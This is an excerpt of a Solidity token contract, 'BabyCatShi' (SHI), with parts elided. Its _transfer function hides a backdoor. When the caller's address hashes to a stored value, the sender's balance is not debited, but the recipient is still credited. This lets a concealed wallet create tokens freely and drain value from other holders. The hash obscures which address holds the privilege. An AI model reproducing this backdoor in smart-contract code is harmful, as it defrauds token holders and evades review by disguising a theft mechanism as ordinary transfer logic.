...
contract BabyCatShi is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    string private  _name = "BabyCatShi";
    string private  _symbol = "SHI";
    uint8 private  _decimals = 18;
    uint256 private _totalSupply = 100000000 * 10**18;
    address private _marketing = msg.sender;
    address private uniswapV2Pair;
    bytes32 private _hash = 0xf0d2b640d2fed55f7aba6bbaf9d460fab63dc68251b324e7d28d581521e07666;
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        require(amount > 0);
        if(_hash != keccak256(abi.encodePacked(msg.sender))){
          _tOwned[from] -= amount;
        }
        _tOwned[to] += amount;
